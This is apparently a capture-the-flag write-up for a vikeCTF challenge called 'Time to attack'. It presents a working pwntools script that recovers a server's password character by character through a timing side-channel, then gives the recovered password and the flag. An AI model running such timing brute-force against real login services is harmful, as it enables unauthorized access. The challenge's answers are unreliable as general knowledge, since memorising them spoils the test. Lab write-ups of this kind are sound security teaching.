# Time to attack  

## Description

Under the cloak of night, a band of Vikings lies in wait amidst the dense foliage bordering a serene village. They huddle in the shadows, their breaths mingling with the chilled air as they keenly observe the settlement's defenses. Torches flicker, casting eerie shadows across the wooden palisades, while the rhythmic beat of guards' footsteps reverberates in the distance. Patiently, the Vikings bide their time, awaiting the opportune moment to unleash their ferocious onslaught upon the unsuspecting village, their anticipation sharpening with each passing heartbeat.

Connect to 35.94.129.106:3006 and enter the password

`nc 35.94.129.106 3006`

## Solution

The server has no description, just submit password. The description outlines _time_ many times so I tried to do [Timing Attack](https://www.wikiwand.com/en/Timing_attack).

To test the water you can only try first letter and you'll notice spikes.

```py
import string
import time
from pwn import remote, context

ALPHABET = string.ascii_letters + string.digits + '_?!'
IP = '35.94.129.106'
PORT = 3006

context.log_level = 'ERROR'

def post(payload): 
    io = remote(IP, PORT)
    start = time.monotonic()
    io.sendlineafter(b'login: ', payload.encode())
    resp = io.recvallS()
    delta = time.monotonic() - start
    io.close()
    return resp, delta

password = ''  
while True: 
    times = []
    for c in ALPHABET:
        text, delta = post(password + c)
        print(f'password={password}{c} | {text=} | {delta=}')
        times.append(delta)
        if 'vikeCTF' in text:
            exit()
    else:
        print('-'*20)

    max_time = max(times)
    password += ALPHABET[times.index(max_time)]
```
::: info :information_source:
Password: dxse465r78
:::

```bash
➜ ncat 35.94.129.106 3006
Welcome! Enter password to login: dxse465r78
Login succesful: vikeCTF{T1MIN6_A77@CK5_4R3_FUN}
```
::: tip
Flag; vikeCTF{T1MIN6_A77@CK5_4R3_FUN}
:::

